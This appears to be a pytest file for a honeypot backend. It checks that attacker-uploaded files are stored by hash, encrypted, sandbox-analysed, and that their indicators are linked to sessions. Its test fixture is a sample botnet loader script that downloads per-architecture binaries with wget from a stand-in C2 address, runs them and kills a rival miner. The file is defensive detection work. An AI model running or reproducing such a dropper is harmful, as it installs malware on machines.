"""Uploaded files survive ingest, get analysed, and surface as indicators.

Covers the join between the engine's capture and the backend's analysis: an
upload arrives with its bytes, is stored once by hash however many sessions
carry it, is reverse-engineered by the detached stage, and the indicators
inside it are attributed back to the session.
"""

import base64
import hashlib
import os

import pytest
from sqlalchemy import select

from app.models import IndicatorOfCompromise, PayloadSample, SessionArtifact, UserRole
from app.services import artifacts, payload_enrichment

INGEST_HEADERS = {"X-Honeypot-Token": os.environ["HONEYPOT_INGEST_TOKEN"]}

LOADER = (
    b"#!/bin/sh\n"
    b"cd /tmp || cd /var/run\n"
    b"for a in mips mipsel arm x86; do wget http://203.0.113.44/b/$a -O .m; "
    b"chmod +x .m; ./.m; done\n"
    b"pkill -9 kinsing\n"
).strip()


def _upload(content: bytes, filename="update.sh", source="ssh_shell", **extra):
    return {
        "filename": filename,
        "sha256": hashlib.sha256(content).hexdigest(),
        "size": len(content),
        "source": source,
        "content_b64": base64.b64encode(content).decode(),
        **extra,
    }


def _session(uploads, ip="203.0.113.77"):
    return {
        "protocol": "ssh",
        "attacker_ip": ip,
        "attacker_port": 40000,
        "started_at": "2026-02-02T02:02:00Z",
        "status": "completed",
        "duration_seconds": 12.0,
        "commands": ["cd /tmp"],
        "uploads": uploads,
    }


async def _node(client, admin):
    response = await client.post(
        "/api/v1/nodes/", headers=admin,
        json={"name": "edge", "protocol": "ssh", "ip_address": "10.0.0.9", "port": 2222},
    )
    return response.json()["id"]


async def _ingest(client, node_id, session):
    response = await client.post(
        f"/api/v1/sessions/ingest-internal?node_id={node_id}",
        headers=INGEST_HEADERS, json=session,
    )
    assert response.status_code == 200, response.text
    return response.json()


async def test_upload_is_stored_by_hash_and_linked(client, auth_headers, db_session):
    admin = await auth_headers(UserRole.ADMIN)
    node_id = await _node(client, admin)
    result = await _ingest(client, node_id, _session([_upload(LOADER)]))
    assert result["uploads_recorded"] == 1

    sample = (await db_session.execute(select(PayloadSample))).scalar_one()
    assert sample.sha256 == hashlib.sha256(LOADER).hexdigest()
    assert sample.content_encrypted is not None
    assert sample.content_encrypted.startswith("v3:")  # AES-256-GCM, encrypted at rest
    assert sample.analysis_status == "pending"

    artifact = (await db_session.execute(select(SessionArtifact))).scalar_one()
    assert artifact.sample_id == sample.id
    assert artifact.source == "ssh_shell"


async def test_same_file_from_two_sessions_is_one_sample(client, auth_headers, db_session):
    admin = await auth_headers(UserRole.ADMIN)
    node_id = await _node(client, admin)
    await _ingest(client, node_id, _session([_upload(LOADER)], ip="203.0.113.1"))
    await _ingest(client, node_id, _session([_upload(LOADER)], ip="203.0.113.2"))

    samples = (await db_session.execute(select(PayloadSample))).scalars().all()
    artifacts_rows = (await db_session.execute(select(SessionArtifact))).scalars().all()
    assert len(samples) == 1          # one file...
    assert len(artifacts_rows) == 2   # ...seen in two sessions


async def test_corrupt_content_is_dropped_but_metadata_kept(client, auth_headers, db_session):
    admin = await auth_headers(UserRole.ADMIN)
    node_id = await _node(client, admin)
    upload = _upload(LOADER)
    upload["content_b64"] = base64.b64encode(b"different bytes").decode()  # hash won't match
    await _ingest(client, node_id, _session([upload]))

    sample = (await db_session.execute(select(PayloadSample))).scalar_one()
    assert sample.content_encrypted is None
    assert sample.analysis_status == "metadata_only"


async def test_detached_analysis_attributes_indicators_to_the_session(
    client, auth_headers, db_session
):
    admin = await auth_headers(UserRole.ADMIN)
    node_id = await _node(client, admin)
    result = await _ingest(client, node_id, _session([_upload(LOADER)]))
    session_id = result["session_id"]

    # Run the stage the endpoint scheduled, directly, so the test is
    # deterministic rather than racing a background task.
    sample = (await db_session.execute(select(PayloadSample))).scalar_one()
    await payload_enrichment.analyse_sample(db_session, sample.id)

    refreshed = (
        await db_session.execute(select(PayloadSample).where(PayloadSample.id == sample.id))
    ).scalar_one()
    assert refreshed.analysis_status == "complete"
    assert refreshed.file_kind == "script"
    assert refreshed.analysis["indicator_count"] >= 1

    iocs = (
        await db_session.execute(
            select(IndicatorOfCompromise).where(IndicatorOfCompromise.session_id == session_id)
        )
    ).scalars().all()
    values = {i.value for i in iocs}
    assert "203.0.113.44" in values  # the C2 from inside the payload
    assert any("payload" in (i.tags or []) for i in iocs)

    artifact = (await db_session.execute(select(SessionArtifact))).scalar_one()
    assert artifact.iocs_recorded is True


async def test_analysis_is_not_repeated_for_a_known_sample(
    client, auth_headers, db_session, monkeypatch
):
    admin = await auth_headers(UserRole.ADMIN)
    node_id = await _node(client, admin)
    await _ingest(client, node_id, _session([_upload(LOADER)]))
    sample = (await db_session.execute(select(PayloadSample))).scalar_one()
    await payload_enrichment.analyse_sample(db_session, sample.id)
    first_analysed_at = sample.analysed_at

    # A second session with the same file must not analyse it again. The
    # sample is handed to the detached stage only so that the new session can
    # be given the indicators already known for it.
    async def must_not_run(*args, **kwargs):
        raise AssertionError("a known sample was analysed a second time")

    monkeypatch.setattr(payload_enrichment.sandbox, "run", must_not_run)
    result = await _ingest(client, node_id, _session([_upload(LOADER)], ip="203.0.113.9"))
    pending = await artifacts.record_uploads(db_session, result["session_id"], [_upload(LOADER)])
    assert pending == [sample.id]
    await payload_enrichment.analyse_sample(db_session, sample.id)
    assert sample.analysed_at == first_analysed_at


async def test_known_sample_indicators_reach_later_sessions(client, auth_headers, db_session):
    """A file analysed last week still names its C2 when it is dropped again.

    Indicators were attributed once, to the sessions that existed when the
    sample was analysed. Every later session carrying the same file got the
    artifact row and none of the indicators.
    """
    admin = await auth_headers(UserRole.ADMIN)
    node_id = await _node(client, admin)
    first = await _ingest(client, node_id, _session([_upload(LOADER)], ip="198.51.100.1"))
    sample = (await db_session.execute(select(PayloadSample))).scalar_one()
    await payload_enrichment.analyse_sample(db_session, sample.id)

    later = await _ingest(client, node_id, _session([_upload(LOADER)], ip="198.51.100.2"))
    # What the ingest route scheduled, run directly so the test is deterministic.
    await payload_enrichment.analyse_sample(db_session, sample.id)

    for session_id in (first["session_id"], later["session_id"]):
        values = [
            i.value
            for i in (
                await db_session.execute(
                    select(IndicatorOfCompromise).where(
                        IndicatorOfCompromise.session_id == session_id,
                        IndicatorOfCompromise.value == "203.0.113.44",
                    )
                )
            ).scalars().all()
        ]
        # Present on both, and written once each however often this runs.
        assert values == ["203.0.113.44"], session_id

    await payload_enrichment.analyse_sample(db_session, sample.id)
    total = (
        await db_session.execute(
            select(IndicatorOfCompromise).where(IndicatorOfCompromise.value == "203.0.113.44")
        )
    ).scalars().all()
    assert len(total) == 2


async def test_recording_uploads_twice_adds_nothing(client, auth_headers, db_session):
    admin = await auth_headers(UserRole.ADMIN)
    node_id = await _node(client, admin)
    result = await _ingest(client, node_id, _session([_upload(LOADER)]))

    for _ in range(2):
        await artifacts.record_uploads(db_session, result["session_id"], [_upload(LOADER)])
        await db_session.commit()

    assert len((await db_session.execute(select(PayloadSample))).scalars().all()) == 1
    assert len((await db_session.execute(select(SessionArtifact))).scalars().all()) == 1


async def test_retried_ingest_records_the_uploads_the_first_attempt_lost(
    client, auth_headers, db_session, monkeypatch
):
    """The session is committed before its uploads are recorded.

    When recording failed, the engine's retry found the session, was told
    "duplicate", and the files were never linked to it.
    """
    admin = await auth_headers(UserRole.ADMIN)
    node_id = await _node(client, admin)
    session = _session([_upload(LOADER)])
    session["session_id"] = "0b6f7a3e-5c1d-4e2f-9a8b-7c6d5e4f3a2b"

    real_record = artifacts.record_uploads
    calls = {"count": 0}

    async def fail_once(db, session_id, uploads):
        calls["count"] += 1
        if calls["count"] == 1:
            raise RuntimeError("simulated failure while recording uploads")
        return await real_record(db, session_id, uploads)

    monkeypatch.setattr(artifacts, "record_uploads", fail_once)

    with pytest.raises(RuntimeError):
        await client.post(
            f"/api/v1/sessions/ingest-internal?node_id={node_id}",
            headers=INGEST_HEADERS, json=session,
        )
    await db_session.rollback()
    assert (await db_session.execute(select(SessionArtifact))).scalars().all() == []

    retry = await _ingest(client, node_id, session)
    assert retry["duplicate"] is True

    artifact = (await db_session.execute(select(SessionArtifact))).scalar_one()
    assert artifact.session_id == retry["session_id"]
    sample = (await db_session.execute(select(PayloadSample))).scalar_one()
    assert sample.sha256 == hashlib.sha256(LOADER).hexdigest()


async def test_report_with_unstorable_text_is_still_saved(
    client, auth_headers, db_session, monkeypatch
):
    """NULs and an over-long label in a report must not strand the sample."""
    admin = await auth_headers(UserRole.ADMIN)
    node_id = await _node(client, admin)
    await _ingest(client, node_id, _session([_upload(LOADER)]))
    sample = (await db_session.execute(select(PayloadSample))).scalar_one()

    async def hostile_report(content, timeout, memory_mb):
        return {
            "status": "complete",
            "report": {
                "analyser_version": "1",
                "file_kind": "script",
                "file_type": {"label": "A" * 5000 + " script"},
                "family": {"family": "F" * 500},
                "summary": "has a NUL \x00 and half a surrogate \ud800 in it",
                "indicators": {"urls": [{"value": "http://203.0.113.5/" + "a" * 900}]},
                "indicator_count": 1,
            },
        }

    monkeypatch.setattr(payload_enrichment.sandbox, "run", hostile_report)
    await payload_enrichment.analyse_sample(db_session, sample.id)

    assert sample.analysis_status == "complete"
    assert len(sample.file_type) <= 128 and len(sample.family) <= 64
    assert "\x00" not in sample.analysis["summary"]
    assert "\ud800" not in sample.analysis["summary"]
    ioc = (
        await db_session.execute(
            select(IndicatorOfCompromise).where(IndicatorOfCompromise.ioc_type == "url")
            .where(IndicatorOfCompromise.value.like("http://203.0.113.5/%"))
        )
    ).scalar_one()
    assert len(ioc.value) <= 500


async def test_sample_that_cannot_be_stored_is_given_up_on(
    client, auth_headers, db_session, monkeypatch
):
    """A pending sample was re-run every hour for ever when its result could
    not be saved. It now fails after PAYLOAD_ANALYSIS_MAX_ATTEMPTS."""
    from sqlalchemy.exc import DataError

    from app.core.config import get_settings
    from app.services import scheduler

    monkeypatch.setattr(get_settings(), "PAYLOAD_ANALYSIS_MAX_ATTEMPTS", 2)
    admin = await auth_headers(UserRole.ADMIN)
    node_id = await _node(client, admin)
    await _ingest(client, node_id, _session([_upload(LOADER)]))
    sample = (await db_session.execute(select(PayloadSample))).scalar_one()

    async def fine_report(content, timeout, memory_mb):
        return {"status": "complete", "report": {"file_kind": "script", "indicators": {}}}

    def refuse_to_store(sample, report):
        raise DataError("INSERT", {}, Exception("simulated: value rejected by the database"))

    monkeypatch.setattr(payload_enrichment.sandbox, "run", fine_report)
    monkeypatch.setattr(payload_enrichment, "_store_report", refuse_to_store)

    await payload_enrichment.analyse_sample(db_session, sample.id)
    await db_session.refresh(sample)
    assert (sample.analysis_status, sample.analysis_attempts) == ("pending", 1)
    assert "could not be stored" in sample.analysis_error

    await payload_enrichment.analyse_sample(db_session, sample.id)
    await db_session.refresh(sample)
    assert (sample.analysis_status, sample.analysis_attempts) == ("failed", 2)

    # And the hourly pass no longer picks it up.
    scheduled = []
    monkeypatch.setattr(payload_enrichment, "schedule", scheduled.extend)
    assert await scheduler._requeue_pending_payloads(db_session) == 0
    assert scheduled == []


async def test_interrupted_sample_is_requeued_until_its_attempts_run_out(
    client, auth_headers, db_session, monkeypatch
):
    from app.core.config import get_settings
    from app.services import scheduler

    monkeypatch.setattr(get_settings(), "PAYLOAD_ANALYSIS_MAX_ATTEMPTS", 3)
    admin = await auth_headers(UserRole.ADMIN)
    node_id = await _node(client, admin)
    await _ingest(client, node_id, _session([_upload(LOADER)]))
    sample = (await db_session.execute(select(PayloadSample))).scalar_one()

    scheduled = []
    monkeypatch.setattr(payload_enrichment, "schedule", scheduled.extend)
    assert await scheduler._requeue_pending_payloads(db_session) == 1
    assert scheduled == [sample.id]

    # As if three runs had each been killed before they could report back.
    sample.analysis_attempts = 3
    await db_session.commit()
    assert await scheduler._requeue_pending_payloads(db_session) == 0
    await db_session.refresh(sample)
    assert sample.analysis_status == "failed"
    assert "gave up" in sample.analysis_error


async def test_oversize_upload_is_metadata_only(client, auth_headers, db_session, monkeypatch):
    from app.core.config import get_settings

    monkeypatch.setattr(get_settings(), "PAYLOAD_MAX_STORE_BYTES", 16)
    admin = await auth_headers(UserRole.ADMIN)
    node_id = await _node(client, admin)
    await _ingest(client, node_id, _session([_upload(LOADER)]))

    sample = (await db_session.execute(select(PayloadSample))).scalar_one()
    assert sample.content_encrypted is None
    assert sample.size == len(LOADER)  # the hash and size are still recorded
